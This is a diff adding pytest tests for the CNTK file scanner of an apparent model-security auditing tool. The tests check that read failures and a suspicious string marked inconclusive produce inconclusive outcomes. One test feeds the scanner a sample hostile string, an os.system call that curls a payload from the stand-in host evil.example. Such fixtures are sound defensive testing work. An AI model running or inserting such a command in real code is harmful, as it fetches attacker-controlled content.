@@ -204,6 +204,26 @@ def test_cntk_scanner_file_read_failure_is_inconclusive_not_security_finding(
         reset_cache_manager()
 
 
+def test_cntk_scanner_signature_read_failure_is_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "signature-unreadable.cmf"
+    _write_cntkv2(path)
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> bytes:
+        raise OSError("simulated CNTK signature read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._read_prefix", raise_os_error)
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "cntk_read_failed" in result.metadata["scan_outcome_reasons"]
+    assert any(check.name == "CNTK File Read" and check.severity == IssueSeverity.INFO for check in result.checks)
+
+
 def test_cntk_scanner_marks_late_string_payload_inconclusive(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -248,6 +268,24 @@ def test_cntk_scanner_marks_late_string_payload_inconclusive(
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
     finally:
         reset_cache_manager()
+
+
+def test_cntk_scanner_inconclusive_warning_signal_is_not_successful(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "warning-before-limit.cmf"
+    _write_cntkv2(path)
+    monkeypatch.setattr(
+        "modelaudit.scanners.cntk_scanner._extract_candidate_strings",
+        lambda _data: (["os.system('curl http://evil.example/payload')"], True),
+    )
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert any(check.severity == IssueSeverity.WARNING for check in result.checks)
 
 
 def test_cntk_scanner_exact_string_limit_preserves_clean_result(
